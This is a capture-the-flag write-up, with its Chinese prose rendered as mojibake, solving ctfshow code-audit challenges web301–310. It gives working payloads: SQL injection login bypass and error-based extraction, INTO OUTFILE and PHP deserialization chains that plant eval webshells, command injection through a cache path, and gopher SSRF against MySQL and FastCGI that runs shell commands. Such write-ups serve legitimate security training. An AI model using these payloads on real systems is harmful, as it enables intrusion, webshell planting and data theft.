### ç®€ä»‹

**ä»£ç å®¡è®¡æ˜¯webé¢˜ä¸­å¾ˆé‡è¦çš„ä¸€ç¯ï¼Œèƒ½å®¡è®¡é•¿ç¯‡çš„ä»£ç ä¹Ÿæ˜¯å®åŠ›çš„ä½“ç°**

### web301

**6.5M**çš„å‹ç¼©åŒ…ï¼Œä½†æ˜¯å…³é”®ç‚¹å°±æ˜¯ç™»é™†ï¼Œçœ‹ä¸€ä¸‹æ£€æµ‹ç™»é™†çš„åœ°æ–¹å°±å¥½äº†

```php
<?php
error_reporting(0);
session_start();
require 'conn.php';
$_POST['userid']=!empty($_POST['userid'])?$_POST['userid']:"";
$_POST['userpwd']=!empty($_POST['userpwd'])?$_POST['userpwd']:"";
$username=$_POST['userid'];
$userpwd=$_POST['userpwd'];
$sql="select sds_password from sds_user where sds_username='".$username."' order by id limit 1;";
$result=$mysqli->query($sql);
$row=$result->fetch_array(MYSQLI_BOTH);
if($result->num_rows<1){
	$_SESSION['error']="1";
	header("location:login.php");
	return;
}
if(!strcasecmp($userpwd,$row['sds_password'])){
	$_SESSION['login']=1;
	$result->free();
	$mysqli->close();
	header("location:index.php");
	return;
}
$_SESSION['error']="1";
header("location:login.php");

?>
```

å¯ä»¥çœ‹åˆ°ï¼Œå¯¹**username**æ²¡æœ‰ä»»ä½•çš„è¿‡æ»¤ğŸ˜„

#### è™šæ‹Ÿè¡¨ç»•è¿‡

å¯ä»¥ç›´æ¥è™šæ‹Ÿè¡¨ç»•è¿‡ï¼Œåªéœ€è¦å°†æŸ¥è¯¢è¯­å¥å¾—åˆ°çš„ç»“æœå˜æˆè‡ªå·±å¯æ§çš„å°±å¥½äº†

```mysql
mysql> select account from admin where username='a' union select 1;
+---------+
| account |
+---------+
|       1 |
+---------+
1 row in set (0.00 sec)
```

æ‰€ä»¥æˆ‘ä»¬åªè¦

```
username=1"'union select 1;#
password=1
```

å°±å¯ä»¥æˆåŠŸç™»é™†çœ‹åˆ°**flag**

#### å†™å…¥ä¸€å¥è¯æœ¨é©¬

```mysql
a' union select "<?php eval($_POST[1]);?>" into outfile "/var/www/html/shell.php"%23
```

ä½†æ˜¯å¥½åƒæ²¡æƒé™å†™å…¥ï¼Œå¡åœ¨**checklogin.php**äº†

ä¹Ÿå¯ç”¨sqlmapä¸€æŠŠæ¢­ï¼Œä½†æ¢­å‡ºæ¥çš„è´¦å·å¯†ç ç«Ÿç„¶ç™»ä¸ä¸Šå»ã€‚ã€‚

### web302

```php
<?php
error_reporting(0);
session_start();
require 'conn.php';
$_POST['userid']=!empty($_POST['userid'])?$_POST['userid']:"";
$_POST['userpwd']=!empty($_POST['userpwd'])?$_POST['userpwd']:"";
$username=$_POST['userid'];
$userpwd=$_POST['userpwd'];
$sql="select sds_password from sds_user where sds_username='".$username."' order by id limit 1;";
$result=$mysqli->query($sql);
$row=$result->fetch_array(MYSQLI_BOTH);
if($result->num_rows<1){
	$_SESSION['error']="1";
	header("location:login.php");
	return;
}
if(!strcasecmp(sds_decode($userpwd),$row['sds_password'])){
	$_SESSION['login']=1;
	$result->free();
	$mysqli->close();
	header("location:index.php");
	return;
}
$_SESSION['error']="1";
header("location:login.php");

?>
```

å°±è¿™é‡Œä¸ä¸€æ ·

```php
if(!strcasecmp(sds_decode($userpwd),$row['sds_password'])){
```

æ‰€ä»¥ä½ å°±æŠŠè™šæ‹Ÿè¡¨ç”Ÿæˆçš„å€¼æ”¹æˆ**userpwd**ç»è¿‡**sds_decode**çš„å€¼å°±å¥½äº†

```php
username=1"' union select 'd9c77c4e454869d5d8da3b4be79694d3';#
password=1
```

è®°å¾—åŠ å¼•å·

### web303

å¼±å£ä»¤admin adminç™»é™†ï¼Œæ²¡æœ‰flag

æ–‡ä»¶é‡Œé¢å¤šäº†**dpt.php dptadd.php**

```php
<?php
session_start();
require 'conn.php';
if(!isset($_SESSION['login'])){
header("location:login.php");
return;
}else{
	//æ³¨å…¥ç‚¹
	$_POST['dpt_name']=!empty($_POST['dpt_name'])?$_POST['dpt_name']:NULL;
	$_POST['dpt_address']=!empty($_POST['dpt_address'])?$_POST['dpt_address']:NULL;
	$_POST['dpt_build_year']=!empty($_POST['dpt_build_year'])?$_POST['dpt_build_year']:NULL;
	$_POST['dpt_has_cert']=!empty($_POST['dpt_has_cert'])?$_POST['dpt_has_cert']:NULL;
	$_POST['dpt_cert_number']=!empty($_POST['dpt_cert_number'])?$_POST['dpt_cert_number']:NULL;
	$_POST['dpt_telephone_number']=!empty($_POST['dpt_telephone_number'])?$_POST['dpt_telephone_number']:NULL;
	
	$dpt_name=$_POST['dpt_name'];
	$dpt_address=$_POST['dpt_address'];
	$dpt_build_year=$_POST['dpt_build_year'];
	$dpt_has_cert=$_POST['dpt_has_cert']=="on"?"1":"0";
	$dpt_cert_number=$_POST['dpt_cert_number'];
	$dpt_telephone_number=$_POST['dpt_telephone_number'];
	$mysqli->query("set names utf-8");
	$sql="insert into sds_dpt set sds_name='".$dpt_name."',sds_address ='".$dpt_address."',sds_build_date='".$dpt_build_year."',sds_have_safe_card='".$dpt_has_cert."',sds_safe_card_num='".$dpt_cert_number."',sds_telephone='".$dpt_telephone_number."';";
	$result=$mysqli->query($sql);
	echo $sql;
	if($result===true){
		$mysqli->close();
		header("location:dpt.php");
	}else{
		die(mysqli_error($mysqli));
	}
	
	 }
?>
```

é‚£ä¹ˆä¼°è®¡å°±æ˜¯è¦æŸ¥è¡¨æ‰¾flagäº†

å †å æ³¨å…¥åªæŠ¥é”™æ— å›æ˜¾ï¼Œé‚£å°±æŠ¥é”™æ³¨å…¥

æœ€åçš„payload

```mysql
dpt_address=1&dpt_build_year=&dpt_cert_number=1&dpt_has_cert=on&dpt_name=1&dpt_telephone_number=1' and (extractvalue(1,concat(0x7e,(select right(flag,30) from sds_fl9g),0x7e)));#
```

ä¸èƒ½å…¨éƒ¨å›æ˜¾ï¼Œéœ€è¦rightçœ‹çœ‹å³è¾¹çš„

### web304

åŒä¸Šé¢˜ï¼Œä¸çŸ¥é“å“ªé‡Œè¿‡æ»¤äº†ï¼Œå”¯ä¸€çš„ä¸åŒå°±æ˜¯flagçš„è¡¨åæ”¹äº†

```mysql
dpt_address=1&dpt_build_year=&dpt_cert_number=1&dpt_has_cert=on&dpt_name=1&dpt_telephone_number=1' and (extractvalue(1,concat(0x7e,(select right(flag,30) from sds_flaag),0x7e)));#
```

### web305

```php
preg_match('/\~|\`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\{|\}|\[|\]|\;|\:|\'|\"|\,|\.|\?|\/|\\\|\<|\>/', $str)
```

è®¾äº†å·¨å¼ºçš„wafï¼ŒåŸºæœ¬ä¸å¯èƒ½sqlæ³¨å…¥äº†

ä½†æ˜¯å¤šäº†ä¸€ä¸ª**class.php**

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-17 13:20:37
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-17 13:33:21
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


class user{
	public $username;
	public $password;
	public function __construct($u,$p){
		$this->username=$u;
		$this->password=$p;
	}
	public function __destruct(){
		file_put_contents($this->username, $this->password);
	}
}
echo serialize(new user('shell.php','<?php @eval($_POST[1]);?>'));

```

å¯ä»¥åˆ©ç”¨æ­¤å¤„çš„ååºåˆ—åŒ–å…¥å£

```php
$user_cookie = $_COOKIE['user'];
if(isset($user_cookie)){
	$user = unserialize($user_cookie);
}
O:4:"user":2:{s:8:"username";s:9:"shell.php";s:8:"password";s:25:"<?php @eval($_POST[1]);?>";}
```

æˆåŠŸå†™å…¥æ–‡ä»¶åè¿æ¥èšğŸ—¡ï¼Œå†åˆ©ç”¨èšğŸ—¡çš„æ•°æ®åº“å·¥å…·æ‹¿åˆ°flag

![image-20220915000001595](D:\Typora\note\CTF\web\ctfshow_vip\ä»£ç å®¡è®¡.assets\image-20220915000001595.png)

å¯†ç æ˜¯é»˜è®¤çš„rootï¼Œä¸æ˜¯é¢˜ç›®ä¸­ç»™å‡ºçš„ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆ

è€Œä¸”**mysql -u root -p**è¿ä¸ä¸Šmysqlï¼Œè¦æ€ä¹ˆè¿å‘¢ï¼Ÿ

### web306

å…³é”®æ–‡ä»¶

**dao.php**

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-17 15:03:23
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-17 15:41:14
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


require 'config.php';
require 'class.php';


class dao{
	private $config;
	private $conn;

	public function __construct(){
		$this->config=new config();
		$this->init();
	}
	private function init(){
		$this->conn=new mysqli($this->config->get_mysql_host(),$this->config->get_mysql_username(),$this->config->get_mysql_password(),$this->config->get_mysql_db());
	}
	public function __destruct(){
		$this->conn->close();
	}

	public function get_user_password_by_username($u){
		$sql="select sds_password from sds_user where sds_username='".$u."' order by id limit 1;";
		$result=$this->conn->query($sql);
		$row=$result->fetch_array(MYSQLI_BOTH);
		if($result->num_rows>0){
			return $row['sds_password'];
		}else{
			return '';
		}
	}

}
```

**class.php**

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-17 13:20:37
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-17 18:41:19
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


class user{
	public $username;
	public $password;
	public function __construct($u,$p){
		$this->username=$u;
		$this->password=$p;
	}
}

class dpt{
	public $name;
	public $address;
	public $build_year;
	public $have_cert="0";
	public $cert_num;
	public $phone;
	public function __construct($n,$a,$b,$h,$c,$p){
		$this->name=$n;
		$this->address=$a;
		$this->build_year=$b;
		$this->have_cert=$h;
		$this->cert_num=$c;
		$this->phone=$p;

	}
}
class log{
	public $title='log.txt';
	public $info='';
	public function loginfo($info){
		$this->info=$this->info.$info;
	}
	public function close(){
		file_put_contents($this->title, $this->info);
	}

}

```

å¾ˆæ˜æ˜¾è¦åˆ©ç”¨**log**çš„**close**å†™å…¥ä¸€å¥è¯æœ¨é©¬

```php
public function __destruct(){
	$this->conn->close();
}
```

è€Œdaoé‡Œé¢æ­£å¥½æœ‰ä¸€ä¸ªåŒåå‡½æ•°

ç„¶ååœ¨index.phpé‡Œé¢æœ‰ååºåˆ—åŒ–å…¥å£

```php
$user = unserialize(base64_decode($_COOKIE['user']));
```

exp

```php
<?php
require 'config.php';
require 'class.php';


class dao{
	public $config;
	public $conn;
}
$dao=new dao();
$log=new log();

$log->title='shell.php';
$log->info='<?php eval($_POST[1]);?>';
$dao->conn=$log;
echo(serialize($dao));
```

ç›´æ¥æŠŠprivateæ”¹ä¸ºpublic

è¿æ¥shellåflagå°±åœ¨æœ¬ç›®å½•ä¸‹

### web307

logçš„closeå‡½æ•°æ”¹åä¸ºcloselogäº†ï¼Œä¸èƒ½ç”¨äº†

ä½†æ˜¯å¤šäº†ä¸€ä¸ªç±»

```php
class dao{
	public $config;
	public $conn;

	public function __construct(){
		$this->config=new config();
		$this->init();
	}
	private function init(){
		$this->conn=new mysqli($this->config->get_mysql_host(),$this->config->get_mysql_username(),$this->config->get_mysql_password(),$this->config->get_mysql_db());
	}
	public function __destruct(){
		$this->conn->close();
	}

	public function get_user_password_by_username($u){
		$sql="select sds_password from sds_user where sds_username='".$u."' order by id limit 1;";
		$result=$this->conn->query($sql);
		$row=$result->fetch_array(MYSQLI_BOTH);
		if($result->num_rows>0){
			return $row['sds_password'];
		}else{
			return '';
		}
	}

	public function get_dpt_all(){
		$sql="select * from sds_dpt;";
		$result=$this->conn->query($sql);
		$dpt_array = array();
		if($result->num_rows>0){
			while($row=$result->fetch_array(MYSQLI_BOTH)){
				array_push($dpt_array, new dpt($row['id'],$row['sds_name'],$row['sds_address'],$row['sds_build_date'],$row['sds_have_safe_card'],$row['sds_safe_card_num'],$row['sds_telephone']));
			}
		}
		return $dpt_array;
	}
	public function insert_dpt($u,$a,$b,$h,$c,$p){
		$sql="insert INTO `sds_dpt` (`sds_name`, `sds_address`, `sds_build_date`, `sds_have_safe_card`, `sds_safe_card_num`, `sds_telephone`) VALUES ('$u', '$a', '$b', '$h', '$c', '$p');";
		$result=$this->conn->query($sql);
		return $result;

	}
	public function  clearCache(){
		shell_exec('rm -rf ./'.$this->config->cache_dir.'/*');
	}

}
```

æœ€åè¿™ä¸ª**clearCache**æ˜¯å¯ä»¥åˆ©ç”¨çš„ï¼Œ**logout.php**é‡Œé¢æœ‰å…¥å£ï¼Œä¹Ÿæ­£å¥½æ˜¯è°ƒç”¨è¿™ä¸ªå‡½æ•°çš„

exp

```php
<?php
class config{
	public $cache_dir = ';echo  "<?php eval(\$_POST[1]);?>" >a.php;';//linuxçš„shellé‡Œé¢$æœ‰ç‰¹æ®Šæ„ä¹‰æ‰€ä»¥è½¬ä¹‰ä¸€ä¸‹ã€‚

}
class dao{
	private $config;
	public function __construct(){
		$this->config=new config();
	}

}
$a=new dao();
echo base64_encode(serialize($a));
?>
```

### web308

åœ¨**clearCache**é‡Œé¢æ–°å¢äº†wafï¼Œè¿‡æ»¤äº†æ‰€æœ‰å­—æ¯

ä½†å¤šäº†ä¸€ä¸ª**checkVersion**

```php
public function checkVersion(){
	return checkUpdate($this->config->update_url);
}

function checkUpdate($url){
		$ch=curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		$res = curl_exec($ch);
		curl_close($ch);
		return $res;
	}
```

ç„¶ååˆå»çœ‹äº†ä¸€çœ¼mysqlæ˜¯æ²¡æœ‰å¯†ç çš„ï¼Œé‚£å¾ˆæ˜æ˜¾å°±æ˜¯**gopher**æ‰“SSRFäº†

exp

```php
<?php
class config{
	public $update_url = 'gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%49%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%73%68%65%6c%6c%2e%70%68%70%22%01%00%00%00%01';
}
class dao{
	private $config;
	public function __construct(){
		$this->config=new config();
	}

}
$a=new dao();
echo urlencode(base64_encode(serialize($a)));
?>
```

å¼€å§‹æƒ³çš„æ— å­—æ¯getshellï¼Œè™½ç„¶æ²¡å›æ˜¾ï¼Œä½†å¯ä»¥è¯•è¯•åå¼¹shellï¼Œä½†æ˜¯æ²¡æˆåŠŸ

![image-20220915163222193](D:\Typora\note\CTF\web\ctfshow_vip\ä»£ç å®¡è®¡.assets\image-20220915163222193.png)

### web309

mysqlåŠ å¯†ç äº†ï¼Œè‚¯å®šå°±æ‰“ä¸äº†mysqläº†

é‚£åªå‰©ä¸‹**rediså’Œfastcgi**äº†ï¼Œå¯ä»¥ç”¨dnslogçœ‹çœŸå®ipï¼Œç„¶ååˆ©ç”¨**dict**åè®®çˆ†ç ´ç«¯å£çœ‹å“ªä¸ªæ˜¯å¼€çš„

[SSRFä¹‹åˆ©ç”¨dictå’ŒgopheråŠæ‰“Redis](https://www.cnblogs.com/CoLo/p/14214208.html)

ä½†æ˜¯dnslogå¥½åƒå¯„äº†

å¯ä»¥åˆ©ç”¨**fastcgi**çš„å»¶æ—¶æ¥çœ‹æ˜¯å¦å­˜åœ¨

```sh
xlccccc@xl-pc:~/Gopherus-master$ python2 gopherus.py --exploit fastcgi


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$

Give one file name which should be surely present in the server (prefer .php file)
if you don't know press ENTER we have default one:  /var/www/html/index.php
Terminal command to run:  sleep 2

Your gopher link is ready to do SSRF:

gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH59%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3B%04%00%3C%3Fphp%20system%28%27sleep%202%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00

-----------Made-by-SpyD3r-----------
```

exp

```php
<?php
class config{
	public $update_url = 'gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH59%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3B%04%00%3C%3Fphp%20system%28%27sleep%202%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00';
}
class dao{
	private $config;
	public function __construct(){
		$this->config=new config();
	}

}
$a=new dao();
echo urlencode(base64_encode(serialize($a)));
?>
```

ç„¶åæ”¹cookieè®¿é—®**/controller/logout.php** ï¼Œç¡®å®åœäº†ä¸¤ç§’(éšä¾¿è¾“æ˜¯ä¸ä¼šåœçš„)

é‚£ä¹ˆå°±å¯ä»¥æ‰“äº†

![image-20220915170319145](D:\Typora\note\CTF\web\ctfshow_vip\ä»£ç å®¡è®¡.assets\image-20220915170319145.png)

```shell
xlccccc@xl-pc:~/Gopherus-master$ python2 gopherus.py --exploit fastcgi


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$

Give one file name which should be surely present in the server (prefer .php file)
if you don't know press ENTER we have default one:  /var/www/html/login.php
Terminal command to run:  cat /var/www/html/f*

Your gopher link is ready to do SSRF:

gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH72%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/login.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00H%04%00%3C%3Fphp%20system%28%27cat%20/var/www/html/f%2A%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00

-----------Made-by-SpyD3r-----------
```

### web310

å»¶æ—¶è¿˜æ˜¯èƒ½è¯•å‡º9000ç«¯å£æ˜¯å­˜åœ¨çš„ï¼Œä½†æ˜¯è¯»ä¸åˆ°flagäº†

çœ‹yuå¸ˆå‚…çš„WPæ˜¯è¯´ï¼Œè¯»nginxé…ç½®æ–‡ä»¶

```php
<?php
class config{
	public $update_url = 'file:///etc/nginx/nginx.conf';
}
class dao{
	private $config;
	public function __construct(){
		$this->config=new config();
	}

}
$a=new dao();
echo urlencode(base64_encode(serialize($a)));
?>
```

```nginx
server {
        listen       4476;
        server_name  localhost;
        root         /var/flag;
        index index.html;

        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
```

å‘ç°äº†è¿™ä¸ªï¼Œé‚£å°±è®¿é—®ä¸€ä¸‹è¿™ä¸ªç½‘ç«™

```php
<?php
class config{
	public $update_url = 'http://127.0.0.1:4476';
}
class dao{
	private $config;
	public function __construct(){
		$this->config=new config();
	}

}
$a=new dao();
echo urlencode(base64_encode(serialize($a)));
?>
```

![image-20220915171253725](D:\Typora\note\CTF\web\ctfshow_vip\ä»£ç å®¡è®¡.assets\image-20220915171253725.png)

<font color='pink'>**ç»“æŸğŸ¤—**</font>

